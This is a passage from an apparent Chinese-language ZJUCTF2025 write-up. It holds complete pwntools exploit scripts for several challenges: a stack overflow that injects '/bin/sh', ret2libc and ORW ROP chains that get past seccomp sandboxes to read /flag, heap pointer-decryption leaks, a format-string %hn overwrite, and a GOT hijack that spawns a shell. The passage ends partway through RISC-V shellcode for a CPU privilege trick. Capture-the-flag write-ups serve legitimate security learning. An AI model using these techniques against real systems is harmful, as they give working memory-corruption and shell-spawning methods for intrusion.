System.out.println(\"\u3010\u65b9\u6848 B\u3011\u5f00\u59cb\u7206\u7834 (\u4f7f\u7528 Unix \u65f6\u95f4\u6233)...\");\n        System.out.println(\"\u641c\u7d22\u79d2\u6570\u8303\u56f4: \u4ece \" + startTimeSec + \" \u5230 \" + endTimeSec);\n\n        byte[] randomBytes = new byte[64];\n        byte[] potentialFlagBytes = new byte[64];\n\n        // === \u5173\u952e\u4fee\u6539\uff1a\u904d\u5386\u7684\u662f\u79d2\uff0c\u800c\u4e0d\u662f\u6beb\u79d2 ===\n        for (long seed = startTimeSec; seed &lt; endTimeSec; seed++) {\n             if ((seed - startTimeSec) % 3600 == 0) { // \u6bcf3600\u79d2\uff081\u5c0f\u65f6\uff09\u6253\u5370\u4e00\u6b21\n                 System.out.println(\"...B \u65b9\u6848\u8fdb\u5ea6: \u5f53\u524d\u79d2\u6570 \" + seed);\n             }\n\n            Random r = new Random(seed);\n            r.nextBytes(randomBytes);\n            for (int i = 0; i &lt; 64; i++) {\n                potentialFlagBytes[i] = (byte) (targetBytes[i] ^ randomBytes[i]);\n            }\n\n            if (startsWith(potentialFlagBytes, \"ZJUCTF{\".getBytes(StandardCharsets.ISO_8859_1))) {\n                // \u6ce8\u610f\uff1a\u8fd9\u91cc\u6253\u5370\u65f6\u9700\u8981\u5c06\u79d2\u8f6c\u56de\u6beb\u79d2\u624d\u80fd\u770b\u5230\u6b63\u786e\u65e5\u671f\n                validateAndPrint(seed * 1000, potentialFlagBytes, seed);\n                return;\n            }\n        }\n        System.out.println(\"\\n\u3010\u65b9\u6848 B\u3011\u5728\u6307\u5b9a\u7684\u65f6\u95f4\u8303\u56f4\u5185\u672a\u627e\u5230 Flag\u3002\");\n    }\n\n    // \u4e3a\u65b9\u6848B\u91cd\u8f7d\u4e00\u4e2a\u6253\u5370\u51fd\u6570\n    private static void validateAndPrint(long seedMillis, byte[] potentialFlagBytes, long actualSeed) {\n        System.out.println(\"\\n[!] \u5728\u79cd\u5b50 \" + actualSeed + \" (\" + new Date(seedMillis) + \") \u53d1\u73b0\u524d\u7f00\u5339\u914d\uff01\u6b63\u5728\u9a8c\u8bc1...\");\n        int flagEndIndex = -1;\n        for (int i = 0; i &lt; potentialFlagBytes.length; i++) { if (potentialFlagBytes[i] == '}') { flagEndIndex = i; break; } }\n        if (flagEndIndex != -1) {\n            int flagLength = flagEndIndex + 1;\n            byte[] flagPattern = new byte[flagLength];\n            System.arraycopy(potentialFlagBytes, 0, flagPattern, 0, flagLength);\n            boolean isPatternValid = true;\n            for (int i = 0; i &lt; potentialFlagBytes.length; i++) { if (potentialFlagBytes[i] != flagPattern[i % flagLength]) { isPatternValid = false; break; } }\n            if (isPatternValid) {\n                System.out.println(\"\\n==============================================\");\n                System.out.println(\"!!! \u6210\u529f\u627e\u5230 Flag !!!\");\n                System.out.println(\"\u6240\u7528\u7684\u79cd\u5b50 (Unix \u79d2\u6570): \" + actualSeed);\n                System.out.println(\"\u5bf9\u5e94\u65f6\u95f4 (\u5927\u7ea6): \" + new Date(seedMillis));\n                System.out.println(\"Flag: \" + new String(flagPattern, StandardCharsets.ISO_8859_1));\n                System.out.println(\"==============================================\");\n            }\n        }\n    }\n\n    private static boolean startsWith(byte[] source, byte[] prefix) {\n        if (source.length &lt; prefix.length) return false;\n        for (int i = 0; i &lt; prefix.length; i++) { if (source[i] != prefix[i]) return false; }\n        return true;\n    }\n}\n</code></pre></p>"},{"location":"ZJUCTF2025/#pwn","title":"pwn","text":""},{"location":"ZJUCTF2025/#who_am_i","title":"who_am_i","text":"<p>\u975e\u5e38\u7b80\u5355\uff0c\u8bfb\u7684\u65f6\u5019\u6ea2\u51fa\u5230command\u91cc\u9762\uff0c\u518d\u6267\u884c\u5c31\u597d\u4e86  \u811a\u672c\u5982\u4e0b <pre><code>from pwn import *\n\n#context.log_level = 'debug'\n#context.terminal = ['tmux', 'splitw', '-h']\ndef s(a):\n    p.send(a)\n\n\ndef sa(a, b):\n    p.sendafter(a, b)\n\n\ndef sl(a):\n    p.sendline(a)\n\n\ndef sla(a, b):\n    p.sendlineafter(a, b)\n\n\ndef r():\n    p.recv()\n\n\ndef pr():\n    print(p.recv())\n\ndef ru(a):\n    return p.recvuntil(a)\n\ndef rl(a):\n    return p.recvline(a)\n\n\ndef itr():\n    p.interactive()\n\n\ndef debug():\n    gdb.attach(p)\n\nchoice=2\nif(choice==1):\n    gdbscript='''\n    b system\n    c\n    '''\n    p = gdb.debug('./who_am_i',gdbscript=gdbscript)\n\nelif(choice==2):\n    p = remote('127.0.0.1',55953)\nelse:\n    p = process('./who_am_i')\nru(b\"Your choice: \")\nsl(b\"2\")\npayload=b\"A\"*50+b\"/bin/sh\\x00\"\nsl(payload)\nru(b\"Your choice: \")\nsl(b\"1\")\nitr()\n#ZJUCTF{n0w_u_know_wh@t_is_staCk_0VerfLow}\n</code></pre></p>"},{"location":"ZJUCTF2025/#revenge-of-who_am_i","title":"revenge of who_am_i","text":"<p>\u4e00\u8840 \u9898\u76ee\u5728\u4e0a\u4e00\u4e2a\u73af\u5883\u91cc\u9762\uff0c\u6240\u4ee5\u4e0a\u4e00\u4e2a\u628acontext.log_level='DEBUG'\u53d6\u6d88\uff0c\u4e0d\u7136\u4e00\u6b21\u8f93\u51fa\u8d85\u8fc70xfff\u5c31\u4f1a\u88ab\u622a\u65ad\uff0c\u7136\u540e\u7528 <pre><code>base64 revenge of who_am_i\n</code></pre> \u5c31\u53ef\u4ee5\u62f7\u51fa\u6765\u4e86\uff0c\u7136\u540e\u672c\u5730 <pre><code>base64 -d cha &gt; pwn\n</code></pre> \u5c31\u6210\u529f\u62ff\u5230\u4e0b\u4e00\u9898\u7684\u9898\u76ee \u54e6\u5bf9\uff0c\u8fd8\u53ef\u4ee5\u5728\u524d\u4e00\u9898\u7684shell\u4e2d\u8fd0\u884c <pre><code>./lib/libc.so.6\uff08\u597d\u50cf\u662f\u8fd9\u4e2a\u5730\u65b9\uff09\n</code></pre> \u5c31\u53ef\u4ee5\u770b\u5230\u672c\u9898\u7528\u7684libc\u73af\u5883\uff0cglibcallinone\u641e\u4e00\u4e2a\u5c31\u884c \u7136\u540e\u8fd9\u4e2a\u9898\u76ee\u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u53ef\u4ee5\u6253rop\uff0c\u7136\u540eprintf\u8fd8\u53ef\u4ee5\u6cc4\u9732libc\u548ccanary\uff0c\u4e0d\u9700\u8981\u6211\u4eec\u53bb\u6253puts_plt puts_got\u7684\u90a3\u4e00\u6761\u94fe\u5b50\u4e86\uff0c\u4f46\u662f\u8fd8\u662f\u6709\u70b9\u95ee\u9898\uff0c\u672c\u5730\u591a\u8c03\u4e00\u4e0b\uff0c\u811a\u672c\u5982\u4e0b <pre><code>from pwn import *\n\n#context.log_level = 'debug'\n#context.terminal = ['tmux', 'splitw', '-h']\ndef s(a):\n    p.send(a)\n\n\ndef sa(a, b):\n    p.sendafter(a, b)\n\n\ndef sl(a):\n    p.sendline(a)\n\n\ndef sla(a, b):\n    p.sendlineafter(a, b)\n\n\ndef r():\n    p.recv()\n\n\ndef pr():\n    print(p.recv())\n\ndef ru(a):\n    return p.recvuntil(a)\n\ndef rl(a):\n    return p.recvline(a)\n\n\ndef itr():\n    p.interactive()\n\n\ndef debug():\n    gdb.attach(p)\n\n\nchoice=2\nif(choice==1):\n    gdbscript='''\n    b printf\n    c\n    c\n    c\n    c\n    c\n    c\n    finish\n    '''\n    p = gdb.debug('./pwn',gdbscript=gdbscript)\nelif(choice==2):\n    #127.0.0.1:55205\n    p = remote('127.0.0.1',59806)\nelse:\n    p = process('./pwn')\nru(b\"Your choice: \")\nsl(b\"2\")\npayload=b\"A\"*50\nsl(payload)\nru(payload)\n\nstack=u32(p.recvn(4))&amp;0xffffff00\nprint(hex(stack))\n\nru(b\"Your choice: \")\nsl(b\"2\")\npayload=b\"A\"*53\nsl(payload)\nru(payload)\np.recvn(1)\nstack_addr=u32(p.recvn(4))\nprint(hex(stack_addr))\n\nru(b\"Your choice: \")\nsl(b\"2\")\npayload=b\"A\"*65\nsl(payload)\nru(payload)\np.recvn(1)\nret_addr=u32(p.recvn(4))\nprint(hex(ret_addr))\nlibc_start_main_addr=ret_addr-121\nprint(hex(libc_start_main_addr))\nlibc=ELF(\"./libc.so.6\")\n#libc_base=libc_start_main_addr-libc.sym[\"__libc_start_main\"]\noff=0xf7cd54a0-0xf7cb4000\nlibc_base=libc_start_main_addr-off\nprint(hex(libc_base))\nsystem_addr=libc_base+libc.sym[\"system\"]\nbinsh_addr=libc_base+next(libc.search(b\"/bin/sh\"))\n#ret=libc.search(asm(\"ret\")).__next__()+libc_base\nputs_addr=libc_base+libc.sym[\"puts\"]\nsl(b\"2\")\npayload=b\"A\"*50+p32(stack)+p32(stack_addr-0x10)+p32(0xdeadbeef)+p32(stack_addr)+p32(system_addr)+p32(0xdeadbeef)+p32(binsh_addr)\nsl(payload)\nru(b\"A\")\nsl(b\"3\")\nitr()\n#ZJUCTF{ea$iest_re72l1bc_u_know_r0p_w3ll}\n</code></pre></p>"},{"location":"ZJUCTF2025/#sandbox-of-who_am_i","title":"sandbox of who_am_i","text":"<p>\u6700\u6076\u5fc3\u7684\u4e00\u96c6\uff0c\u5177\u4f53\u6709\u591a\u6076\u5fc3\u5f97\u770b\u6211\u548c\u57ce\u5821\u8001\u5e08\u7684\u804a\u5929\u8bb0\u5f55  \u6c99\u7bb1ban\u4e86execve\u548copen\uff0c\u53ef\u4ee5\u7528ORW\uff0c\u7136\u540eopen\u7528openat\u66ff\u4ee3\u3002 <pre><code>line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005\n 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009\n 0005: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0009\n 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009\n 0007: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0009\n 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0009: 0x06 0x00 0x00 0x00000000  return KILL\n ```\n\u8fd9\u91ccmalloc\u8d85\u754c\uff0c\u672c\u6765\u60f3\u7740\u6ca1\u6709free\u600e\u4e48\u52ab\u6301\u554a\uff0c\u8c03\u8bd5\u53d1\u73b0seccomp\u5f00\u6c99\u7bb1\u4f1a\u8ba9bin\u91cc\u9762\u6709\u4e00\u5927\u5806\u5757\uff0c\u4e8e\u662f\u4efb\u610fmalloc\uff0c\u5229\u7528\u73b0\u6709\u7684\u5c0f\u5757\uff0c\u6253environ,unsortedbin\u524d\u9762\u7684\uff0c\u5206\u914d\u51fa\u6765\u6cc4\u9732libc\uff0c\u7136\u540e\u7528fd\u6307\u9488\u6cc4\u9732\u5806\u5730\u5740\uff0c\u7136\u540ebydglibc2.35\u5bf9fd\u6307\u9488\u8fdb\u884c\u4e86\u52a0\u5bc6\uff0c\u8fd8\u8981\u89e3\u5bc6\uff0c12\u4f4d12\u4f4d\u5f02\u6216\u56de\u53bb\u53bb\u6cc4\u9732heap\u57fa\u5730\u5740\uff0clibc\u91cc\u9762\u62ff\u5230environ\u4e4b\u540e\u6cc4\u9732\u6808\u5730\u5740\uff0c\u52ab\u6301\u7528\u5806\u4efb\u610f\u5206\u914d\u6765\u62ff\u5206\u914d\u6808\u5730\u5740\uff0c\u4ece\u800c\u52ab\u6301\u8fd4\u56de\u5730\u5740\uff0c\u5361\u5c31\u5361\u5728\uff0c\u4ed6\u7528exit\u9000\u51fa\u7684\uff0c\u4e0d\u901a\u8fc7return 0\u8fd4\u56de\uff0c\u5bfc\u81f4\u6211\u6ca1\u6cd5\u62ff\u5230\u52ab\u6301\u8fd4\u56de\u5730\u5740\uff0c\u6700\u540e\u505a\u51fa\u6765\u662f\u7a81\u7136\u53d1\u73b0\u53ef\u4ee5\u52ab\u6301read\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u4ece\u800c\u6267\u884crop\u3002\u8fd8\u6709\uff0c\u8fd9\u73a9\u610ffd\u4e3a\u4ec0\u4e48\u662f5\u554a\uff0c\u771f\u6076\u5fc3\nexp\u5982\u4e0b\n```python\n\nfrom pwn import *\n\n\n\ncontext.log_level = 'debug'\n#context.terminal = ['tmux', 'splitw', '-h']\ndef s(a):\n    p.send(a)\n\n\ndef sa(a, b):\n    p.sendafter(a, b)\n\n\ndef sl(a):\n    p.sendline(a)\n\n\ndef sla(a, b):\n    p.sendlineafter(a, b)\n\n\ndef r():\n    p.recv()\n\n\ndef pr():\n    print(p.recv())\n\ndef ru(a):\n    return p.recvuntil(a)\n\ndef rl(a):\n    return p.recvline(a)\n\n\ndef itr():\n    p.interactive()\n\n\ndef debug():\n    gdb.attach(p)\n\n\nchoice=2\nif(choice==1):\n    gdbscript='''\n    b printf\n\n    c\n    c\n    c\n    c\n    c\n\n    c\n    c\n    c\n    c\n    c\n    c\n    c\n    c\n\n    c\n    c\n\n    c\n    c\n    c\n    c\n    c\n    c\n    c\n    c\n    finish\n\n    '''\n    p = gdb.debug('./pwn',gdbscript=gdbscript)\nelif(choice==2):\n    #127.0.0.1:55205\n    p = remote('127.0.0.1',52718)\nelse:\n    p = process('./pwn')\nsl(b\"2\")\nsl(b\"50\")\npayload=b\"A\"*63\nsl(payload)\nru(payload)\np.recvn(1)\nmain_arena=u64(p.recvn(6).ljust(8,b'\\x00'))\nprint(hex(main_arena))\noff=0x7efea0e52ce0-0x7efea0c35000-0x3000\nlibc_base=main_arena-off\nprint(hex(libc_base))\nlibc=ELF(\"./libc.so.6\")\nenv=libc_base+libc.sym['__environ']\nsl(b\"2\")\nsl(str(0x60).encode())\npayload=b\"A\"*14*8\ns(payload)\nru(payload)\nfd=u64(p.recvn(6).ljust(8,b'\\x00'))\nprint(hex(fd))\nhigh=(fd&amp;0xfff000000000)&gt;&gt;36\nmiddle_high=((fd&amp;0xfff000000)&gt;&gt;24)^high\nmiddle_low=(((fd&amp;0xfff000)&gt;&gt;12)^middle_high)-1\nnow_addr=(high&lt;&lt;36)+(middle_high&lt;&lt;24)+(middle_low&lt;&lt;12)+0xfe0\nprint(hex(now_addr))\ntrue_fd=fd^(now_addr&gt;&gt;12)\nprint(hex(true_fd))\nsl(b\"2\")\nsl(str(0x62).encode())\nfake_env=(true_fd&gt;&gt;12)^(env-0x80)\nprint(hex(env))\npayload=b\"A\"*8*28+p64(fake_env)\nsl(payload)\nru(b\"Hello\")\nfor i in range (3):\n    sl(b\"2\")\n    sl(str(0x72).encode())\n    sl(b\"A\")\n    ru(b\"Hello\")\nsl(b\"2\")\nsl(str(0x74).encode())\npayload=b\"A\"*(16*8-1)\nsl(payload)\nru(payload)\np.recvn(1)\nstack_addr=u64(p.recvn(6).ljust(8,b'\\x00'))\nprint(hex(stack_addr))\noffset_addr=0x7ffd7a4568e8-0x7ffd7a456a08+0x240\nprint(hex(offset_addr))\nret_addr=(stack_addr-offset_addr)-8\n\nsl(b\"2\")\nsl(b\"10\")\noff_heap=0x55e16aae2270-0x55e16aae2670\n\noffret=0x7ffe5c1e24d0-0x7ffe5c1e2490\nfake_stack=((true_fd-off_heap)&gt;&gt;12)^(ret_addr-offret-0x100)\nprint(hex(ret_addr))\npayload=b\"A\"*32+p64(fake_stack)\n\nsl(payload)\nru(b\"Hello\")\n\n\nfor i  in range(3):\n    sl(b\"2\")\n    sl(str(0x62).encode())\n    sl(b\"A\")\n    ru(b\"Hello\")\n\n\nsl(b\"2\")\nsl(str(0x64).encode())\nopenat=libc_base+libc.sym['openat']\nrdi=0x2a3e5+libc_base\nrsi=0x2be51+libc_base\nrax=0x45eb0+libc_base\nrdx_rbx=0x904a9+libc_base\nread_addr=libc_base+libc.sym['read']\nwrite_addr=libc_base+libc.sym['write']\npayload=b\"\"\n\n\n\npayload+=(0x100-len(payload))*b\"\\x00\"\n#payload+=p64(ret_addr-offret-0x100+8)\npayload+=b\"/flag\\x00\\x00\\x00\"+p64(rsi)+p64(ret_addr-offret)+p64(rdi)+p64(0xFFFFFFFFFFFFFF9C)#AT_FDCWD\npayload+=p64(rdx_rbx)+p64(0)*2\npayload+=p64(openat)\npayload+=p64(rdi)+p64(5)\npayload+=p64(rsi)+p64(stack_addr)\npayload+=p64(rdx_rbx)+p64(0x50)*2\npayload+=p64(read_addr)\npayload+=p64(rdi)+p64(1)\npayload+=p64(rsi)+p64(stack_addr)\npayload+=p64(rdx_rbx)+p64(0x50)*2\npayload+=p64(write_addr)\nsl(payload)\n\nprint(hex(ret_addr-offret-0x100))\n\n\n\nitr()\n</code></pre></p>"},{"location":"ZJUCTF2025/#2048","title":"2048","text":"<p>\u7b80\u5355\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u751a\u81f3\u90fd\u4e0d\u7528\u52ab\u6301\u8fd4\u56de\u5730\u5740\uff0c\u53ea\u8981\u80fd\u591f\u8986\u5199score\u5c31\u53ef\u4ee5\u62ff\u4e0bflag\uff0c\u8c03\u4e00\u8c03\u5c31\u80fd\u8fc7 <pre><code>from pwn import *\n\n\n\ncontext.log_level = 'debug'\n#context.terminal = ['tmux', 'splitw', '-h']\ndef s(a):\n    p.send(a)\n\n\ndef sa(a, b):\n    p.sendafter(a, b)\n\n\ndef sl(a):\n    p.sendline(a)\n\n\ndef sla(a, b):\n    p.sendlineafter(a, b)\n\n\ndef r():\n    p.recv()\n\n\ndef pr():\n    print(p.recv())\n\ndef ru(a):\n    return p.recvuntil(a)\n\ndef rl(a):\n    return p.recvline(a)\n\n\ndef itr():\n    p.interactive()\n\n\ndef debug():\n    gdb.attach(p)\nchoice=0\nif(choice==1):\n    gdbscript='''\n    b main\n    c\n\n    '''\n    p=gdb.debug(\"./target\",gdbscript=gdbscript)\nelif(choice==2):\n    p=process(\"./target\")\nelse:\n    p=remote('127.0.0.1',50589)\nscore=0x503c\n\npayload=b\"%p\"\nsl(payload)\nru(b\"unknown cmd: \")\nleak=int(p.recvline().strip(),16)\nprint(hex(leak))\noffset=0x558d425d018e-0x558d425d2000\ntar=leak+score-offset-0x55f5fac3603c+0x55f5fac3103c\nprint(hex(tar))\n\npayload=b\"b\"+f\"%{0xffef}x\".encode()+b\"%22$hn\"\npayload+=(0x10-len(payload)+1)*b\"A\"\npayload+=p64(tar)\npayload+=(0x1f-len(payload))*b\"A\"\nprint(payload)\nsl(payload)\npayload=b\"b\"+f\"%{0xffef}x\".encode()+b\"%22$hn\"\npayload+=(0x10-len(payload)+1)*b\"A\"\npayload+=p64(tar+2)\nprint(payload)\nsl(payload)\n#debug()\nsl(b\"a\")\nitr()\n</code></pre></p>"},{"location":"ZJUCTF2025/#safe","title":"safe","text":"<p>\u4e09\u8840 \u7b2c\u4e00\u6b21\u505a\u591a\u7ebf\u7a0bpwn\uff0c\u770b\u4e00\u770b\uff0c\u5c31\u662f\u5b58\u5728unsafecode\u548csafecode\uff0csafecode\u4e00\u76f4\u8c03\u7528puts\uff0cunsafecode\u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u4f46\u662f\u6709\u4e2a\u6c99\u7bb1 <pre><code>In the sandbox...\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x06 0x40000003  if (A != ARCH_I386) goto 0008\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x15 0x03 0x00 0x00000001  if (A == exit) goto 0007\n 0004: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0007\n 0005: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0007\n 0006: 0x15 0x00 0x01 0x000000ad  if (A != rt_sigreturn) goto 0008\n 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0008: 0x06 0x00 0x00 0x00000000  return KILL\n ```\n\u88abban\u7684\u5dee\u4e0d\u591a\u4e86\uff0c\u6ca1\u5f00pie\uff0c\u6211\u4eec\u901a\u8fc7\u6808\u6ea2\u51fa\u6253putsplt\u3001puts_got\u7684\u90a3\u4e00\u6761\u94fe\u5b50\u6765\u6cc4\u9732libc\u5417\uff0c\u7136\u540e\u7528call read_plt\u7684\u65b9\u6cd5\uff0c\u8bbe\u7f6e\u597d\u53c2\u6570\uff0c\u6765\u91cd\u5199puts\u7684got\uff0c\u4ece\u800c\u52ab\u6301puts\uff0c\u56e0\u4e3asafecode\u5e76\u6ca1\u6709\u5f00\u6c99\u7bb1\uff0c\u6240\u4ee5\u52ab\u6301\u8fd9\u4e2a\u5230read\u524d\u9762\u6c99\u7bb1\u540e\u9762\uff0c\u8fd9\u6837\u518d\u6253\u4e00\u6b21\u6808\u6ea2\u51fa\u62ffshell\uff0c\u4e0d\u8fc7tmd\uff0c\u8fd9B\u9898\u4e00\u4e2a\u662f\u8c03\u8bd5\u8d77\u6765\u5f88\u56f0\u96be\uff0c\u7136\u540e\u8fd8\u6709\u5c31\u662f32\u4f4d\u4f20\u591a\u4e2a\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6700\u540e\u8fd8\u6709\u5947\u602a\u7684\u60c5\u51b5\uff0c\u660e\u660esystem\u7684\u4f20\u53c2\u662f\\bin\\sh\u7684\u5730\u5740\uff0c\u8fd8\u662f\u62ff\u4e0d\u5230shell\uff0c\u6700\u540e\u4e00\u70b9\u4e00\u70b9\u8ddf\u53d1\u73b0\u662f\u5728execve\u7684\u65f6\u5019\uff0c\u4ed6\u7684environ\u53c2\u6570\u662f0x41414141\uff0c\u5e94\u8be5\u662febp\u88ab\u5199\u574f\u51fa\u7684\u5947\u602a\u95ee\u9898\uff0c\u61d2\u5f97\u4fee\u4e86\uff0c\u53cd\u6b63\u628apadding\u6362\u6210\\x00\u5c31\u884c\u4e86\uff0c\u6539\u5b8cok\uff0c\u6240\u4ee5\u4f60\u4f1a\u53d1\u73b0\u6211\u7684\u811a\u672c\u7528\u7684padding\u90fd\u662f\\x00\n\u811a\u672c\u5982\u4e0b\n```python\nfrom pwn import *\n\n\n\ncontext.log_level = 'debug'\n#context.terminal = ['tmux', 'splitw', '-h']\ndef s(a):\n    p.send(a)\n\n\ndef sa(a, b):\n    p.sendafter(a, b)\n\n\ndef sl(a):\n    p.sendline(a)\n\n\ndef sla(a, b):\n    p.sendlineafter(a, b)\n\n\ndef r():\n    p.recv()\n\n\ndef pr():\n    print(p.recv())\n\ndef ru(a):\n    return p.recvuntil(a)\n\ndef rl(a):\n    return p.recvline(a)\n\n\ndef itr():\n    p.interactive()\n\n\ndef debug():\n    gdb.attach(p)\nchoice=0\nif(choice==1):\n    gdbscript='''\n    #set scheduler-locking on\n    #b *0x08048826\n    b *0x804883A\n    b read\n    c\n    c\n    '''\n    p=gdb.debug(\"./safe\",gdbscript=gdbscript)\nelif(choice==2):\n    p=process(\"./safe\")\nelse:\n    p=remote('127.0.0.1',59728)\nread_plt=0x8048590\npop3_ret=0x8048949\nbss_addr=0x804a000+0x100\nputs_got=0x804a030-8\nexit_plt=0x80488E9\npop1_ret=0x804894b\npop2_ret=0x0804894A\n\n'''\n\n'''\nputs_plt=0x080485F0\npayload=b\"\\x00\"*0x408+p32(bss_addr)+p32(puts_plt)+p32(pop1_ret)+p32(puts_got)+p32(read_plt)+p32(pop3_ret)+p32(0)+p32(bss_addr)+p32(0x200)+p32(read_plt)+p32(exit_plt)+p32(0)+p32(puts_got)+p32(10)\npayload+=b\"\\x00\"*(0x800-len(payload))\ns(payload)\nif(choice==0):\n    ru(b\"In the sandbox...\\n\")\n    s1=u32(p.recvn(4))\n    print(hex(s1))\nelse:\n    s1=u32(p.recvuntil('\\xf7')[-4:])\n    print(hex(s1))\nlibc=ELF(\"./libc-2.27.so\")\nlibc_base=s1-libc.sym['puts']\nprint(\"libc_base\",hex(libc_base))\nopen_addr=libc_base+libc.sym['open']\nwrite_addr=libc_base+libc.sym['write']\nsystem_addr=libc_base+libc.sym['system']\nbinsh_addr=libc_base+next(libc.search(b'/bin/sh\\x00'))\nret_addr=libc_base+libc.search(asm(\"ret\")).__next__()\nsleep(0.001)\n#0x00003aac \npop_esp=0x00003aac+libc_base\n#payload2=\n#payload2=b\"/flag\\x00\\x00\\x00\"+p32(open_addr)+p32(pop2_ret)+p32(0)+p32(bss_addr)+p32(read_plt)+p32(pop3_ret)+p32(0x200)+p32(bss_addr+0x400)+p32(3)+p32(write_addr)+p32(pop3_ret)+p32(0x200)+p32(bss_addr+0x400)+p32(1)\npayload2=p32(system_addr)+p32(pop1_ret)+p32(binsh_addr)\npayload2+=b\"\\x00\"*(0x200-len(payload2))\ns(payload2)\npayload3=p32(0x8048809)\npayload3+=b\"\\x00\"*(10-len(payload3))\ns(payload3)\n\npayload4=(0xf7c6c2e8-0xf7c6bf30-12)*b\"\\x00\"+p32(0x400000)*3+p32(ret_addr)+p32(system_addr)+p32(0xdeadbeef)+p32(binsh_addr)\ns(payload4)\n'''\npayload=0x408*b\"A\"+p32(0xdeadbeef)+p32(read_plt)+p32(ret1_addr)+p32(0x200)+p32(bss_addr)+p32(0)\npayload+=p32(read_plt)+p32(exit_plt)+p32(10)+p32(puts_got)+p32(0)\npayload+=b\"A\"*(0x800-len(payload))\ns(payload)\n'''\nitr()\n</code></pre> \u62ff\u4e0b</p>"},{"location":"ZJUCTF2025/#cs_master","title":"cs_master","text":"<p>\u4e00\u8840 \u201c\u5c06\u519b\u8bf4CPU\u4e00\u5b9a\u8981\u6709\u4eba\u5199\u201d\u961f\u540d\u7684\u7531\u6765 CPU pwn\uff0c\u7b11\u6b7b\u4e86\u6700\u6709\u610f\u601d\u7684\u4e00\u96c6\u3002 \u770b\u4e86\u4e00\u5927\u5806\uff0c\u521a\u5f00\u59cb\u4e0d\u77e5\u9053\u505a\u4ec0\u4e48\uff0c\u4ed4\u7ec6\u8bfb\u53d1\u73b0\u662f\u8981\u53bb\u4e00\u7247\u88ab\u4fdd\u62a4\u7684\u533a\u57df\u91cc\u9762\u8bfb\u5185\u5b58\uff0c\u867d\u7136\u6211\u672c\u5730\u4e0a\u8dd1\u4ed6\u4e00\u76f4\u662f\u7279\u6743\u6001\uff0c\u4e00\u76f4\u90fd\u80fd\u8bfb\u51fa\u6765\uff0c\u968f\u540e\u53d1\u73b0\u8fdc\u7a0b\u4e0a\u4e0d\u884c\u3002\u968f\u540e\u601d\u8def\u5c31\u662f\u5982\u4f55\u8fdb\u5165\u7279\u6743\u6001\uff0c\u60f3\u7684\u529e\u6cd5\u5c31\u662fecall\uff0c\u4f46\u662fecall\u4f1a\u5361\u6b7b\uff0c\u4ed4\u7ec6\u770b\u6ce2\u5f62\u56fe\u53d1\u73b0\u4ed6ecall\u4f1a\u8df3\u5165stvec\uff0c\u4f46\u662fstvec\u7684\u503c\u662f0\uff0c\u7136\u540e\u4ece0\u518d\u8dd1\u56deshellcode\uff0c\u7136\u540e\u518d\u6267\u884cshellcode\u91cc\u9762\u7684ecall\uff0c\u5bfc\u81f4\u5361\u6b7b\uff0c\u4f46\u662f\u60f3\u8981\u52ab\u6301stvec\u53c8\u8981csrw\uff0c\u8fd9\u4e2a\u6709\u8981\u6c42\u8981\u7279\u6743\u6001\uff0c\u8fd9\u4e0d\u5c31\u6b7b\u5faa\u73af\u4e86\u5417\uff0c\u540e\u9762\u5c31\u50cf\u5982\u4f55\u5728\u4e0d\u6267\u884cecall\u4e0b\u8fdb\u5165\u7279\u6743\u6001\uff0c\u4ed4\u7ec6\u770b\u4ee3\u7801\u53d1\u73b0branch_taken\u7684\u4f18\u5148\u7ea7\u5927\u4e8eecall\uff0c\u4e5f\u5c31\u662fflush\u4f18\u5148\u7ea7\u66f4\u9ad8\uff0c\u800c\u4e14flush\u4e0d\u4f1a\u6e05\u7a7anext_privilege\uff0c\u5bfc\u81f4\u5982\u679c\u6211\u4eecb\u578b\u540e\u9762\u52a0\u4e00\u6761ecall\uff0c\u7136\u540eb\u578b\u8df3\u8d70\uff0c\u8fd9\u6837\u53ef\u4ee5\u5077\u5230\u7279\u6743\u6001\uff0c\u968f\u540e\u6267\u884c\u5373\u53ef\u62ff\u5230\u7279\u6743\u6001\uff0c\u8bfb\u51faflag\u5373\u53ef \u5de5\u5177\u6709</p> <p>RV32\u5728\u7ebf\u6c47\u7f16\u5668 \u5c06\u6307\u4ee4\u8f6c\u6362\u4e3abase64 <pre><code>import base64\nfrom pwn import *\n\n# \u8bbe\u7f6e\u67b6\u6784\uff08\u867d\u7136 p32 \u4e0d\u9700\u8981\u8fd9\u4e2a\u4e0a\u4e0b\u6587\u4e5f\u80fd\u5de5\u4f5c\uff0c\u4f46\u4fdd\u6301\u4e60\u60ef\u5f88\u597d\uff09\ncontext.arch = 'riscv32'\n\n# \u8fd9\u91cc\u653e\u5165\u4f60\u624b\u52a8\u786c\u7f16\u7801\u7684\u673a\u5668\u7801 (\u5b57\u7b26\u4e32\u5f62\u5f0f)\n# \u4e0d\u9700\u8981\u624b\u52a8\u52a0 0x\uff0c\u811a\u672c\u4f1a\u81ea\u52a8\u5904\u7406\nhex_instructions = [\n    \"00000463\",\n    \"00000073\",\n\n    \"00100093\",\n    \"01f00113\",\n    \"002090b3\",\n    \"00008093\",\n    \"0000a183\",\n\n\n\n\n    \"0040a203\",\n    \"0080a283\",\n    \"00c0a303\",\n    \"0100a383\",\n    \"0140a403\",\n    \"0180a483\",\n    \"01c0a503\",\n    \"0200a583\",\n    \"0240a603\",\n    \"0280a683\",\n    \"02c0a703\",\n    